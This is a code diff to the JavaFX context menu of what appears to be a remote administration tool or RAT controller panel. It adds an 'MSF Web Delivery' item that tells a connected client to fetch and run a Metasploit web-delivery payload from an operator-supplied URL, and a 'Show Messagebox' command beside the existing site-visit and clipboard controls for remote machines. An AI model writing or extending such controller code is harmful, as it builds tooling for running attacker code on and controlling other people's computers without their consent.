@@ -116,6 +116,26 @@ class IPContextMenu implements Repository {
             }
         });
 
+        MenuItem si7 = new MenuItem("MSF Web Delivery");
+        si7.setOnAction(event -> {
+            Stage stage = new Stage();
+            stage.initStyle(StageStyle.UNDECORATED);
+            stage.setMinWidth(300);
+            stage.setMinHeight(300);
+            stage.setScene(new Scene(new WebDeliveryView().getWebDeliveryView(stage), 400, 300));
+            stage.show();
+            WebDeliveryView.getExecuteButton().setOnAction(a -> {
+                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                    try {
+                        String target = WebDeliveryView.getTargetsComboBox().getSelectionModel().getSelectedItem().toString().toLowerCase();
+                        clientObject.clientCommunicate("MSFWD " + target + " " + WebDeliveryView.getUrl().getText());
+                    } catch (IOException e1) {
+                        e1.printStackTrace();
+                    }
+                }
+            });
+        });
+
         // Clipboard junk
         Menu clip = new Menu("Clipboard Functions");
         MenuItem setClipboard = new MenuItem("Set Clipboard");
@@ -171,15 +191,35 @@ class IPContextMenu implements Repository {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                     try {
                         clientObject.clientCommunicate("VISIT " + VisitWebsiteView.getUrl().getText().trim());
+                        stage.close();
                     } catch (IOException e1) {
 
                     }
                 }
             });
         });
-        misc.getItems().addAll(visit);
+        MenuItem showMsgbox = new MenuItem("Show Messagebox");
+        showMsgbox.setOnAction(event -> {
+            Stage stage = new Stage();
+            stage.initStyle(StageStyle.UNDECORATED);
+            stage.setMinHeight(100);
+            stage.setMinWidth(300);
+            stage.setScene(new Scene(new ShowMessageboxView().getShowMessageboxView(stage)));
+            stage.show();
+            ShowMessageboxView.getGoButton().setOnAction(a -> {
+                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                    try {
+                        clientObject.clientCommunicate("MSGBOX " + ShowMessageboxView.getMsg().getText().trim());
+                        stage.close();
+                    } catch (IOException e1) {
 
-        mi1.getItems().addAll(sb1, sb2, sb3, si4, si5, si6, clip, misc);
+                    }
+                }
+            });
+        });
+        misc.getItems().addAll(visit, showMsgbox);
+
+        mi1.getItems().addAll(sb1, sb2, sb3, si4, si5, si6, si7, clip, misc);
         MenuItem mi2 = new MenuItem("Copy IP");
         mi2.setOnAction(event -> {
             final Clipboard clipboard = Clipboard.getSystemClipboard();
